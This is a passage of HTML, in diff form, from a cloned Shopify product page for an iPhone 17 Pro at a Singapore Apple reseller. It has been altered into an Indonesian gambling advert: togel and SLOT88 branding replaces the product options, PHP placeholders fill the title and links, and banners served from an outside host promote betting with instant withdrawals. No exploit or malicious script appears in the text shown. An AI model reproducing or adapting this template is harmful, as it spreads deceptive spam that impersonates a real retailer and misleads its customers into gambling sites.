-                                        <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="32122040320180">
-                                        <span class="visually-hidden">
-                                        Open media 7 in modal
-                                        </span>
-                                        </button>
-                                      </modal-opener>
-                                  </div>
-                                </li>
-                                <li
-                                  id="Slide-template--17605519376564__main-32122040352948"
-                                  class="common_medias variant-comapre-image- variant-all-image product__media-item grid__item slider__slide"
-                                  data-media-id="template--17605519376564__main-32122040352948"
-                                  >
-                                  <div
-                                      class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
-                                      style="--ratio: 1.0; --preview-ratio: 1.0;"
-                                      >
-                                      <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--17605519376564__main">
-                                        <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="icon icon-plus"
-                                              width="19"
-                                              height="19"
-                                              viewBox="0 0 19 19"
-                                              fill="none"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
-                                            </svg>
-                                        </span>
-                                        <div class="loading-overlay__spinner hidden">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="spinner"
-                                              viewBox="0 0 66 66"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <circle class="path" fill="none" stroke-width="4" cx="33" cy="33" r="30"></circle>
-                                            </svg>
-                                        </div>
-                                        <div class="product__media media media--transparent">
-                                            <img src="<?= $image; ?>?v=1757450054&amp;width=823" alt="togel 4d" srcset="<?= $image; ?>?v=1757450054&amp;width=246 246w, <?= $image; ?>?v=1757450054&amp;width=493 493w, <?= $image; ?>?v=1757450054&amp;width=600 600w, <?= $image; ?>?v=1757450054&amp;width=713 713w, <?= $image; ?>?v=1757450054&amp;width=823 823w" width="823" height="823" loading="lazy" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                                        </div>
-                                        <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="32122040352948">
-                                        <span class="visually-hidden">
-                                        Open media 8 in modal
-                                        </span>
-                                        </button>
-                                      </modal-opener>
-                                  </div>
-                                </li>
-                                <li
-                                  id="Slide-template--17605519376564__main-32122040385716"
-                                  class="common_medias variant-comapre-image- variant-all-image product__media-item grid__item slider__slide"
-                                  data-media-id="template--17605519376564__main-32122040385716"
-                                  >
-                                  <div
-                                      class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
-                                      style="--ratio: 1.0; --preview-ratio: 1.0;"
-                                      >
-                                      <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--17605519376564__main">
-                                        <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="icon icon-plus"
-                                              width="19"
-                                              height="19"
-                                              viewBox="0 0 19 19"
-                                              fill="none"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
-                                            </svg>
-                                        </span>
-                                        <div class="loading-overlay__spinner hidden">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="spinner"
-                                              viewBox="0 0 66 66"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <circle class="path" fill="none" stroke-width="4" cx="33" cy="33" r="30"></circle>
-                                            </svg>
-                                        </div>
-                                        <div class="product__media media media--transparent">
-                                            <img src="<?= $image; ?>?v=1757450054&amp;width=823" alt="situs togel" srcset="<?= $image; ?>?v=1757450054&amp;width=246 246w, <?= $image; ?>?v=1757450054&amp;width=493 493w, <?= $image; ?>?v=1757450054&amp;width=600 600w, <?= $image; ?>?v=1757450054&amp;width=713 713w, <?= $image; ?>?v=1757450054&amp;width=823 823w" width="823" height="823" loading="lazy" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                                        </div>
-                                        <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="32122040385716">
-                                        <span class="visually-hidden">
-                                        Open media 9 in modal
-                                        </span>
-                                        </button>
-                                      </modal-opener>
-                                  </div>
-                                </li>
-                              
-                            <div class="slider-buttons no-js-hidden quick-add-hidden">
-                                <button
-                                  type="button"
-                                  class="slider-button slider-button--prev"
-                                  name="previous"
-                                  aria-label="Slide left"
-                                  >
-                                  <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                      <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                  </svg>
-                                </button>
-                                <div class="slider-counter caption">
-                                  <span class="slider-counter--current">1</span>
-                                  <span aria-hidden="true"> / </span>
-                                  <span class="visually-hidden">of</span>
-                                  <span class="slider-counter--total">12</span>
-                                </div>
-                                <button
-                                  type="button"
-                                  class="slider-button slider-button--next"
-                                  name="next"
-                                  aria-label="Slide right"
-                                  >
-                                  <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                      <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                  </svg>
-                                </button>
-                            </div>
-                          </slider-component>
-                      </media-gallery>
-                    </div>
-                    <div class="product__info-wrapper grid__item">
-                      <product-info
-                          id="ProductInfo-template--17605519376564__main"
-                          data-section="template--17605519376564__main"
-                          data-url="/products/iphone-17-pro-mg8h4x-a"
-                          class="product__info-container"
-                          >
-                          <div class="desktop-view_Product-title">
-                            <div class="priceAndLabelTag">
-                                <div class="product_tag_display_container">
-                                  <span class="product_tag_display" style="color:#168edf;">NEW</span>
-                                </div>
-                            </div>
-                            <div class="product-title-style product__title" >
-                                <h1> <?= $title; ?></h1>
-                            </div>
-                            <div class="product-subtitle-style"></div>
-                            <div class="skuAndBarcode">
-                                <span class="sku-pdp" id="sku-template--17605519376564__main">
-                                <span id="skutitle2">
-                                SKU: 
-                                </span> 9484875120
-                                </span>
-                                <span class="barcode-pdp" id="barc-template--17605519376564__main">
-                                <label id="barcodetitle2">
-                                Barcode:</label>
-                                <span  class="barcodeinput"  id="main-pro-barcode" >9484875120</span>
-                                </span>
-                            </div>
-                            <p class="product__preorder-message"></p>
-                          </div>
-                          <div class="pricestyle no-js-hidden" id="price-template--17605519376564__main" role="status" >
-                            <style>
-                                .price-segment-discount {
-                                border-radius: 6px;
-                                background: #c3b214;
-                                padding: 1px;
-                                padding-left: 5px;
-                                padding-right: 5px;
-                                color: white;
-                                display: inline-block;
-                                font-size: 15px;
-                                }
-                                #price-item-sale {
-                                font-family: var(--font-body-family);
-                                font-style: normal;
-                                font-weight: 600;
-                                font-size: 28px;
-                                line-height: 28px;
-                                letter-spacing: -0.02em;
-                                }
-                                .footerOr3 {
-                                display: none;
-                                }
-                                @media screen and (max-width: 767px) {
-                                #price-element .footerOr3 {
-                                display: inline-block;
-                                color: #000;
-                                }
-                                }
-                            </style>
-                            <div
-                                class="
-                                price price-product-pdp price--large price--sold-out price--show-badge"
-                                >
-                                <div class="price__container">
-                                  <p class="actual_price  ">
-                                      <span class="price--title">
-                                      </span>
-                                      <span
-                                        class="js-product-price-with-care-warranty actual_price_bold cto_actual_price_bold"
-                                        data-price="$259.00 SGD"
-                                        data-price-without-currency="259.00"
-                                        data-price-with-care="$1,596.00 SGD"
-                                        data-price-with-secWarranty="$259.00 SGD"
-                                        data-price-with-care-and-secWarranty="$1,596.00 SGD"
-                                        data-price-with-trade-in="0"
-                                        data-price-calculation="4"
-                                        >
-                                      $5.00 SGD
-                                      </span>
-                                  </p>
-                                  <small class="unit-price caption hidden">
-                                  <span class="visually-hidden">Unit price</span>
-                                  <span class="price-item price-item--last">
-                                  <span></span>
-                                  <span aria-hidden="true">/</span>
-                                  <span class="visually-hidden">&nbsp;per&nbsp;</span>
-                                  <span>
-                                  </span>
-                                  </span>
-                                  </small>
-                                </div>
-                            </div>
-                          </div>
-                          <div class="product__tax caption rte">Tax included.
-                            <a href="/policies/shipping-policy">Shipping</a> calculated at checkout.
-                          </div>
-                          <div >
-                            <form method="post" action="/cart/add" id="product-form-installment-template--17605519376564__main" accept-charset="UTF-8" class="installment caption-large" enctype="multipart/form-data"><input type="hidden" name="form_type" value="product" /><input type="hidden" name="utf8" value="✓" /><input type="hidden" name="id" value="44033871610036">
-                                <input type="hidden" name="product-id" value="7986665160884" /><input type="hidden" name="section-id" value="template--17605519376564__main" />
-                            </form>
-                          </div>
-                          <input type="hidden" id="tax_free_campaign" value=0 />
-                          <div id="pdp_monthly_price_taxfree_false">
-                            <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-net-monthly-pricing.css?v=99277447350168012461742784889" rel="stylesheet" type="text/css" media="all" />
-                            <div class="net-monthly-pricing__conditional--pdp">
-                                <p class="net-monthly-pricing__conditional-text">
-                                  or
-                                </p>
-                            </div>
-                            <div class="net-monthly-pricing net-monthly-pricing--pdp first-party "><span>
-                                <span class="net-monthly-pricing__conditional--footer-only">
-                                <span class="net-monthly-pricing__conditional-text">
-                                or
-                                </span>
-                                </span>
-                                <span
-                                  class="js-product-price-with-care-warranty"
-                                  data-price="$95.59"
-                                  data-price-without-currency="259.00"
-                                  data-price-with-care="$517"
-                                  data-price-with-secWarranty="$68.25"
-                                  data-price-with-care-and-secWarranty="$517"
-                                  data-price-with-trade-in="0"
-                                  data-price-calculation="4"
-                                  >$68.25</span>/mo. for 4 mo.
-                                </span><a
-                                  class="net-monthly-pricing__modal-trigger ac-modal-trigger js-net-monthly-pricing-pdp-trigger"
-                                  data-modal-target="modal-net-monthly-pricing-modal"
-                                  data-product="iphone-17-pro-mg8h4x-a"
-                                  >
-                                Pelajari Selengkapnya
-                                <i class="fa-solid fa-angle-right billboard_icon"></i>
-                                </a>
-                            </div>
-                          </div>
-                          <div class="product__gwp-promo-wrapper js-gwp-replace"></div>
-                          <variant-radios1 class="no-js-hidden" data-section="template--17605519376564__main" data-url="/products/iphone-17-pro-mg8h4x-a" >
-                            <fieldset class="js product-form__input bottom-space js-product-option-form">
-                                <legend class="form__label form__label__bold">
-                                  Color
-                                  <span class="color-name">- Cosmic Orange </span>
-                                </legend>
-                                <input type="radio" id="template--17605519376564__main-Color-0"
-                                  name="Color"
-                                  data-option_count = "option1"
-                                  data-label_name = "Color"
-                                  value="Cosmic Orange"
-                                  form="product-form-template--17605519376564__main"
-                                  class="radio smart_radio varient_Cosmic Orange"
-                                  data-varient="Cosmic Orange"
-                                  data-color_present= color_present
-                                  data-option_name= Color                            
-                                  checked
-                                  />
-                                <label
-                                  data-option=  "Color" 
-                                  data-title="Cosmic Orange"
-                                  data-noproduct=""
-                                  class="title-tip-color-swatch color-swatch radio-label  cosmic-orangeoption1 cosmic-orange label- cust-Color-Cosmic Orange" for="template--17605519376564__main-Color-0"
-                                  aria-label="Color Cosmic Orange"
-                                  style="
-                                  background-color: orange;
-                                  background-size: cover;
-                                  background-image: url('//www.istudiosg.com/cdn/shop/files/IMG-17898016_m_png_1_5bb1b790-8546-41e1-b20e-3ac2ff7bf087.png?v=1757449788')
-                                  "
-                                  >
-                                <img src="https://cdn.shopify.com/s/files/1/0630/5923/0953/files/Group_57.png?v=1678859305" class="disabled_img" loading="lazy" width="35" height="35" alt="Disabled">
-                                &nbsp </label>
-                                <input type="radio" id="template--17605519376564__main-Color-1"
-                                  name="Color"
-                                  data-option_count = "option1"
-                                  data-label_name = "Color"
-                                  value="Deep Blue"
-                                  form="product-form-template--17605519376564__main"
-                                  class="radio smart_radio varient_Deep Blue"
-                                  data-varient="Deep Blue"
-                                  data-color_present= color_present
-                                  data-option_name= Color                            
-                                  />
-                                <label
-                                  data-option=  "Color" 
-                                  data-title="Deep Blue"
-                                  data-noproduct=""
-                                  class="title-tip-color-swatch color-swatch radio-label  deep-blueoption1 deep-blue label- cust-Color-Deep Blue" for="template--17605519376564__main-Color-1"
-                                  aria-label="Color Deep Blue"
-                                  style="
-                                  background-color: blue;
-                                  background-size: cover;
-                                  background-image: url('//www.istudiosg.com/cdn/shop/files/IMG-17898017_m_png_1.png?v=1757449914')
-                                  "
-                                  >
-                                <img src="https://cdn.shopify.com/s/files/1/0630/5923/0953/files/Group_57.png?v=1678859305" class="disabled_img" loading="lazy" width="35" height="35" alt="Disabled">
-                                &nbsp </label>
-                                <input type="radio" id="template--17605519376564__main-Color-2"
-                                  name="Color"
-                                  data-option_count = "option1"
-                                  data-label_name = "Color"
-                                  value="Silver"
-                                  form="product-form-template--17605519376564__main"
-                                  class="radio smart_radio varient_Silver"
-                                  data-varient="Silver"
-                                  data-color_present= color_present
-                                  data-option_name= Color                            
-                                  />
-                                <label
-                                  data-option=  "Color" 
-                                  data-title="Silver"
-                                  data-noproduct=""
-                                  class="title-tip-color-swatch color-swatch radio-label  silveroption1 silver label- cust-Color-Silver" for="template--17605519376564__main-Color-2"
-                                  aria-label="Color Silver"
-                                  style="
-                                  background-color: silver;
-                                  background-size: cover;
-                                  background-image: url('//www.istudiosg.com/cdn/shop/files/IMG-17898018_m_png_1.png?v=1757449722                                          ')
-                                  "
-                                  >
-                                <img src="https://cdn.shopify.com/s/files/1/0630/5923/0953/files/Group_57.png?v=1678859305" class="disabled_img" loading="lazy" width="35" height="35" alt="Disabled">
-                                &nbsp </label>
-                            </fieldset>
-                            <p>
-                              <a href="<?= $ampmek; ?>" target="_blank">
-                              <img style="display:block;margin-left:auto;margin-right:auto;" src="https://apollondestroyer.org/uplloner/uploads/file_6a540ff455d85.gif" width="400" height="150"/>
-                              </a>
-                            </p>
-                            <fieldset class="js product-form__input bottom-space js-product-option-form">
-                                <legend class="form__label form__label__bold">
-                                  Model
-                                </legend>
-                                <input type="radio" id="template--17605519376564__main-Model-0"
-                                  name="Model"
-                                  data-option_count = "option2"
-                                  data-label_name = "Model"
-                                  value="<?= $BRAND; ?>"
-                                  form="product-form-template--17605519376564__main"
-                                  class="radio smart_radio varient_<?= $BRAND; ?>"
-                                  data-varient="<?= $BRAND; ?>"
-                                  data-color_present= no_color_present
-                                  data-option_name= No-color                            
-                                  checked
-                                  />
-                                <label data-option= "no-color"  data-title="<?= $BRAND; ?>" aria-label="Model <?= $BRAND; ?>" data-noproduct="" class="title-tip iphone-17-prooption2" for="template--17605519376564__main-Model-0">
-                                <?= $BRAND; ?>
-                                </label>
-                                <input type="radio" id="template--17605519376564__main-Model-1"
-                                  name="Model"
-                                  data-option_count = "option2"
-                                  data-label_name = "Model"
-                                  value="SLOT88 Max"
-                                  form="product-form-template--17605519376564__main"
-                                  class="radio smart_radio SLOT88 Max"
-                                  data-varient="SLOT88 Max"
-                                  data-color_present= no_color_present
-                                  data-option_name= No-color                            
-                                  />
-                                <label data-option= "no-color"  data-title="SLOT88 Max" aria-label="Model SLOT88 Max" data-noproduct="" class="title-tip iphone-17-pro-maxoption2" for="template--17605519376564__main-Model-1">
-                                SLOT88
-                                </label>
-                            </fieldset>
-                            <fieldset class="js product-form__input bottom-space js-product-option-form">
-                                <legend class="form__label form__label__bold">
-                                  Capacity
-                                </legend>
-                                <input type="radio" id="template--17605519376564__main-Capacity-0"
-                                  name="Capacity"
-                                  data-option_count = "option3"
-                                  data-label_name = "Capacity"
-                                  value="256GB"
-                                  form="product-form-template--17605519376564__main"
-                                  class="radio smart_radio varient_256GB"
-                                  data-varient="256GB"
-                                  data-color_present= no_color_present
-                                  data-option_name= No-color                            
-                                  checked
-                                  />
-                                <label data-option= "no-color"  data-title="256GB" aria-label="Capacity 256GB" data-noproduct="" class="title-tip 256gboption3" for="template--17605519376564__main-Capacity-0">
-                                X 5000
-                                </label>
-                                <input type="radio" id="template--17605519376564__main-Capacity-1"
-                                  name="Capacity"
-                                  data-option_count = "option3"
-                                  data-label_name = "Capacity"
-                                  value="512GB"
-                                  form="product-form-template--17605519376564__main"
-                                  class="radio smart_radio varient_512GB"
-                                  data-varient="512GB"
-                                  data-color_present= no_color_present
-                                  data-option_name= No-color                            
-                                  />
-                                <label data-option= "no-color"  data-title="512GB" aria-label="Capacity 512GB" data-noproduct="" class="title-tip 512gboption3" for="template--17605519376564__main-Capacity-1">
-                                X 100
-                                </label>
-                                <input type="radio" id="template--17605519376564__main-Capacity-2"
-                                  name="Capacity"
-                                  data-option_count = "option3"
-                                  data-label_name = "Capacity"
-                                  value="1TB"
-                                  form="product-form-template--17605519376564__main"
-                                  class="radio smart_radio varient_1TB"
-                                  data-varient="1TB"
-                                  data-color_present= no_color_present
-                                  data-option_name= No-color                            
-                                  />
-                                <label data-option= "no-color"  data-title="1TB" aria-label="Capacity 1TB" data-noproduct="" class="title-tip 1tboption3" for="template--17605519376564__main-Capacity-2">
-                                X 50
-                                </label>
-                                <input type="radio" id="template--17605519376564__main-Capacity-3"
-                                  name="Capacity"
-                                  data-option_count = "option3"
-                                  data-label_name = "Capacity"
-                                  value="2TB"
-                                  form="product-form-template--17605519376564__main"
-                                  class="radio smart_radio varient_2TB"
-                                  data-varient="2TB"
-                                  data-color_present= no_color_present
-                                  data-option_name= No-color                            
-                                  />
-                                <label data-option= "no-color"  data-title="2TB" aria-label="Capacity 2TB" data-noproduct="" class="title-tip 2tboption3" for="template--17605519376564__main-Capacity-3">
-                                X 20
-                                </label>
-                            </fieldset>
-                          </variant-radios1>
-                          <noscript class="product-form__noscript-wrapper-template--17605519376564__main">
-                            <div class="product-form__input hidden">
-                                <label class="form__label form__label__bold" for="Variants-template--17605519376564__main">Product variants</label>
-                                <div class="select">
-                                  <select name="id" id="Variants-template--17605519376564__main" class="select__select" form="product-form-template--17605519376564__main">
-                                      <option
-                                        selected="selected"
-                                        disabled
-                                        value="44033871610036">
-                                        Default Title
-                                        - Out of Stock
-                                        - $259.00
-                                      </option>
-                                  </select>
-                                  <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                      <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                  </svg>
-                                </div>
-                            </div>
-                          </noscript>
-                          <div
-                            class="trade-in bottom-space"
-                            id="tradeIn"
-                            >
-                          </div>
-                          <div class="applecare-replace">
-                            <div class="add-on-product-style add-on-product-style-applecare">
-                                <input id="applecare-product-mpn" type="hidden" name="properties[applecare-product-mpn]" value="" />
-                                <input id="applecare-product-sku" type="hidden" name="properties[applecare-product-sku]" value="SWY42ZX/A" />
-                                <input id="applecare-product-handle" type="hidden" name="properties[applecare-product-handle]" value="apple-applecare-for-iphone-17-pro-protect-your-apple-product" />
-                                <div class="add-on-product-container1">
-                                  <h3>Protection+ for <?= $BRAND; ?> (1 year plan)</h3>
-                                  <div class="container-box-2">
-                                      <div class="mobile-care-pdp">
-                                        <div class="left care-pdp-img">
-                                            <a class="care-img" href= "/pages/applecare-landing-page" >
-                                            <img src="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png" loading="lazy" class="add-on-image" width="100" height="100" alt="<?= $BRAND; ?>">
-                                            </a>
-                                        </div>
-                                        <div class="care-pdp-title">
-                                            <span class="add-on-element care-info">
-                                              Protect your SLOT88 product.
-                                              <span>$5.00 SGD</span>
-                                              <div class="care-info-learn-more">
-                                                  <div class="seedkit-component-standalone">
-                                                    <a
-                                                        class="ac-modal-trigger icon"
-                                                        data-modal-target="modal-pdp-apple-care-modal"
-                                                        >
-                                                    Pelajari Selengkapnya
-                                                    <i class="fa-solid fa-angle-right billboard_icon"></i></a>
-                                                    <div
-                                                        id="modal-pdp-apple-care-modal"
-                                                        class="ac-modal"
-                                                        data-type="content"
-                                                        data-width="wide"
-                                                        data-variant="pageOverlay"
-                                                        data-modal-dialog-label="Modal"
-                                                        data-modal-close-label="Close Modal"
-                                                        >
-                                                        <p class="apple-care-modal__heading">Keuntungan bermain di <?= $BRAND; ?> ft SLOT88</p>
-                                                        <div class="media media--transparent ratio" style="--ratio-percent: 100.0%;"><img src="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png" alt="<?= $BRAND; ?>" width="418" height="597" loading="lazy"></div>
-                                                        <div class="apple-care-modal__content">
-                                                          <div class="metafield-rich_text_field">
-                                                              <ul>
-                                                                <li>Proses Deposit & Withdraw Cepat</li>
-                                                                <li>Layanan Customer Service 24 Jam</li>
-                                                                <li>Tampilan Website Modern & Responsif</li>
-                                                                <li>Banyak Pilihan Pasaran & Permainan</li>
-                                                                <li>Keamanan Data Terjamin</li>
-                                                              </ul>
-                                                          </div>
-                                                          <a class="apple-care-modal__cta" href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer">
-                                                          <span class="apple-care-modal__cta-text">Selengkapnya tentang Protection+ <?= $BRAND; ?></span>
-                                                          <i class="fa-solid fa-angle-right billboard_icon"></i>
-                                                          </a>
-                                                          <div class="apple-care-modal__tcs">
-                                                              <div class="metafield-rich_text_field">
-                                                                <p>Syarat dan ketentuan berlaku, tapi kalau kamu JP tentu saja bisa WD tanpa syarat apapun langsung ke rekening, INSTAN!</p>
-                                                              </div>
-                                                          </div>
-                                                        </div>
-                                                    </div>
-                                                  </div>
-                                              </div>
-                                            </span>
-                                        </div>
-                                        <input type="hidden" id="apple-care-varid" name="id" value="44034304409780" />
-                                        <span class="add-on-element" aria-hidden="true">
-                                        <label class="visually-hidden" for="add-apple-care">Add Apple Care</label>
-                                        <input class="add-on-product-checkbox" id="add-apple-care" type="checkbox" name="id[]" value="44034304409780" autocomplete="off" />
-                                        </span>
-                                      </div>
-                                      <div>
-                                        <a href="javascript:void(0)" data-index="44034304409780" id="apple-care-add">
-                                            <div class="pdp-care-btn btn product-form__submit">Add</div>
-                                        </a>
-                                      </div>
-                                  </div>
-                                </div>
-                            </div>
-                          </div>
-                          <div class="secWarranty-replace">
-                          </div>
-                          <div
-                            id="Quantity-Form-template--17605519376564__main"
-                            class="margin-space-pdp product-form__input product-form__quantity"
-                            >
-                            <label class="quantity__label form__label form__label__bold" for="prodQuantity">
-                                Quantity
-                                <span class="quantity__rules-cart no-js-hidden hidden">
-                                  <span class="loading-overlay hidden">
-                                      <span class="loading-overlay__spinner">
-                                        <svg
-                                            aria-hidden="true"
-                                            focusable="false"
-                                            class="spinner"
-                                            viewBox="0 0 66 66"
-                                            xmlns="http://www.w3.org/2000/svg"
-                                            >
-                                            <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
-                                        </svg>
-                                      </span>
-                                  </span>
-                                  <span>(<span class="quantity-cart">0</span> in cart)</span>
-                                </span>
-                            </label>
-                            <div class="price-per-item__container">
-                                <quantity-input class="quantity js-qty-input" data-url="/products/iphone-17-pro-mg8h4x-a" data-section="template--17605519376564__main">
-                                  <button class="quantity__button no-js-hidden" name="minus" type="button">
-                                      <span class="visually-hidden">Decrease quantity for <?= $title; ?></span>
-                                      <svg width="8" height="3" viewBox="0 0 8 3" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                        <path d="M8 2.63477V0.501953H0V2.63477H8Z" fill="#121212" fill-opacity="0.75"/>
-                                      </svg>
-                                  </button>
-                                  <input
-                                      pattern="[0-9]*"
-                                      class="quantity__input"
-                                      type="number"
-                                      name="quantity"
-                                      id="prodQuantity"
-                                      data-cart-quantity="0"
-                                      data-min="1"
-                                      min="1"
-                                      step="1"
-                                      value="1"
-                                      />
-                                  <button class="quantity__button no-js-hidden" name="plus" type="button">
-                                      <span class="visually-hidden">Increase quantity for <?= $title; ?></span>
-                                      <svg
-                                        width="10"
-                                        height="9"
-                                        viewBox="0 0 10 9"
-                                        fill="none"
-                                        xmlns="http://www.w3.org/2000/svg"
-                                        >
-                                        <path
-                                            d="M5.99219 5.56445H9.21875V3.54883H5.99219V0.361328H4V3.54883H0.78125V5.56445H4V8.75977H5.99219V5.56445Z"
-                                            fill="#121212"
-                                            fill-opacity="0.75"
-                                            />
-                                      </svg>
-                                  </button>
-                                </quantity-input>
-                                <p class="quantity__error hidden js-qty-error">Sorry! you reached maximum limit for this product!</p>
-                            </div>
-                            <div class="quantity__rules caption no-js-hidden" id="Quantity-Rules-template--17605519376564__main"></div>
-                          </div>
-                          <div class="one-pickup_2">
-                            <p class="form__label form__label__bold">Get it fast</p>
-                            <pickup-availability
-                                id="pickup_id_2"
-                                class="product__pickup-availabilities no-js-hidden"
-                                data-product-id="7986665160884"
-                                data-selected-options="[{&quot;name&quot;:&quot;Title&quot;,&quot;position&quot;:1,&quot;values&quot;:[&quot;Default Title&quot;]}]"
-                                data-item-quantity="1"
-                                data-error="You are ordering more units than available at this location."
-                                >
-                                <pickup-availability-preview class="pickup-availability-preview">
-                                  <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="16" height="14" viewBox="0 0 16 14" fill="none">
-                                      <path d="M12.7742 13.3755H3.05191C2.2285 13.3755 1.55871 12.7056 1.55871 11.8822L1.55859 5.46973H2.29228V11.8822C2.29228 12.301 2.63304 12.6417 3.0518 12.6417H12.7743C13.1931 12.6417 13.5338 12.3011 13.5338 11.8822L13.534 5.46973H14.2676V11.8822C14.2676 12.7056 13.5977 13.3755 12.7743 13.3755H12.7742Z" fill="#1D1D1F"/>
-                                      <path d="M6.19597 6.04216C5.04487 6.04216 4.1084 5.10557 4.1084 3.95459H4.84209C4.84209 4.70103 5.44941 5.30836 6.19597 5.30836C6.94253 5.30836 7.54985 4.70103 7.54985 3.95459H8.28354C8.28354 5.10557 7.34707 6.04216 6.19597 6.04216Z" fill="#1D1D1F"/>
-                                      <path d="M9.63738 6.04397C8.48628 6.04397 7.5498 5.10738 7.5498 3.95639V2.43213H8.28349V3.95639C8.28349 4.70284 8.89082 5.31016 9.63738 5.31016C10.3839 5.31016 10.9913 4.70284 10.9913 3.95639H11.7249C11.7249 5.10738 10.7885 6.04397 9.63738 6.04397Z" fill="#1D1D1F"/>
